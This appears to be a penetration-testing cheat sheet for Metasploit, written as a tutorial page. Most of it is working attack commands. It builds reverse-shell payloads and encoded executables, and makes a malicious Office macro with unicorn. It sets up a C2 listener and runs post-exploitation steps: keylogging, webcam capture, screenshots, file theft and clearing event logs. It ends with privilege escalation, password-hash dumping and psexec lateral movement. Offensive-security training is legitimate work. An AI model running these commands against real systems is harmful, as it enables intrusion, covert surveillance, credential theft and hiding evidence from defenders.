---
title: "Metasploit"
description: "Widely used penetration testing framework."
lead: ""
date: 2020-10-13T15:21:01+02:00
lastmod: 2020-10-13T15:21:01+02:00
draft: false
images: []
menu: 
  tools:
    parent: "attacker_tools"
weight: 10
toc: true
---

Metasploit[^1] is a widely used penetration testing framework developed by Rapid7[^2].
It can be used to test exploits against target endpoints and try out vulnerabilities. 
A great and detailed tutorial about the usage of Metasploit can be found at the Offensive Security[^3] site.

The following samples were created with Metasploit 6.x on a Kali Linux.

## Connect to database
To store test results, Metasploit can be connected to a database.

```bash
# start database
systemctl start postgresql

# initial database
msfdb init

# validate in metasploit console
db_status 
```

## Start Metasploit Console
```bash
msfconsole -q
```

## Session Handling
When connecting to a target, Metasploit is opening a new session for this connection.

```bash
#display avilable sesions
sessions -l

#enter session
sessions -i <session id>

#leave session
background
```

## Create payloads
Metasploit offers a variety of payloads. 

### Simple Binary Payload
A binary is often the simplest way for manual testing to establish a c2 connection.

```bash
#run outside of msf console
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<server_ip> LPORT=<server_port> -b "\x00" -e x86/shikata_ga_nai -f exe -o <out_path.exe>
```

- lhost = ip of the Metasploit server
- lport = port to connect back to the Metasploit server
- -e = encoding to use
- -o = output directory
Copy the binary to the target client and executed after you started the c2 server.

### Macro Payload
The default macro generation of Metasploit didn't work for me on a fully patched Windows 10 client and the latest Office O365 version. Therefore, I used the unicorn[^4] tool created by TrustedSec[5]. It uses a PowerShell downgrade attack and executed the shell code into the memory of the victim.

To use, simply clone the repository from GitHub and execute with python:

```bash
# clone repository
git clone https://github.com/trustedsec/unicorn.git
cd unicorn

#use unicorn
python unicorn.py windows/meterpreter/reverse_https <server_ip> 443 macro
```

You can use the different meterpreter payloads or choose an alternative to the macro like hta.
The command will create the file _powershell_attack.txt_ and the file _unicorn.rc_. The _powershell_attack.txt_ contains the macro, which has to be included inside a word document.
To add a macro to a word document go to View -> Macros -> Macro name: AutoOpen -> Create.

Warning: The macro used an old syntax for the automated macro execution. For newer version of word replace the sub name **Auto_Open** with **AutoOpen**. 

The _unicorn.rc can be used to setup a Metasploit listener with the command:
```bash
msfconsole -r unicorn.rc
```
Unfortunately, this didn't work for me, so I had to setup the listener manual.

## Start Listener / C2 Server
Inside Metasploit run:
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST <server_ip>
set LPORT <server_port>
```
As soon as you executed the binary or open the word on the victims machine, there should be a new session available. If not, check it the firewall ports are open or if the AV has removed the shell code from the victim.

## Usefull Session Commands
The following commands are meant to be executed inside an active session.

### systeminfo
To get basic info about the victims machine use:
```bash
sysinfo
```

### user
To check the user context use:
```bash
getuid
```

### cmd shell
Open a cmd shell:
```bash
shell
```

### running processes
List running processes
```bash
ps
#you can use grep to search for a specific process
ps | grep explorer
```
For some commands you need to be injected in the right process like 
for taking screenshots you need to be in explorer.exe

### process migration
```bash
migrate <pid>
```

### screenshot
Grab a screenshot:
```bash
use espia
screengrab
```

### keylogger
Grab key strokes:
```bash
#start collecting
keyscan_start

#dump collected results
keyscan_dump
```

### search / download files
It's also possible to search and download files:
```bash
search -f *.doc
download C:\\password.db
```

### webcam
Access webcams:
```bash
webcam_list
webcam_snap -i <webcam id>
```

### event logs
Clear event logs:
```bash
clearev
```

## Privilege escalation
In most cases you start with low privileged, and therefore you need to find a way to escalate to higher privileges. The possibility to do this depends if you can find a vulnerability on the system.
If the victim machine is an older or unpatched OS you can try out the automated getsystem scripts, which tries out several methods.

```bash
# load priv extension
use priv

# try out available methods
getsystem
```

If this doesn't work, you can try out the methods manually or use a local exploit.

```bash
#leave session
background

#list exploits
use exploit/-> tab autocompletion
search <keyword> -t exploit
```

## Dump password hashes
If you have SYSTEM privileges, you can easily dump the password hashes with:
dump password hashes:

```bash
run post/windows/gather/hashdump 
```

## Scan for SMB Shares
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS <range>
set THREADS <number>
run
```

- \<range\> = scan range e.g. 192.168.5-10
- \<number\> = number of threads

## Lateral movement with psexec
If you were able to dump the password hashes you can try to jump to other machines with psexec. Scan for possible targets with the SMB Shares scan first and then try out:
```bash
use exploit/windows/smb/psexec
set payload windows/shell/reverse_tcp
set LHOST <target_ip>
set SMBUser <username> 
set SMBPass <password hash>
expoit
```
If this doesn't work, check if the AV on the target is removing the payload and if the firewall allows the connections. In a local network you also need to enable network discovery and the admin share[6].


[^1]: Metasploit ](https://www.metasploit.com/)

[^2]: [Rapid7](https://www.rapid7.com/)

[^3]: [Offensive Security - Metasploit course](https://www.offensive-security.com/metasploit-unleashed/)

[^4]: [unicorn](https://github.com/trustedsec/unicorn)

[^5]: [TrustedSec](https://www.trustedsec.com/)

[^6]: [Enable C$ Admin share](https://cormang.com/2018/01/06/enable-c-admin-share-windows-10-server-2016/)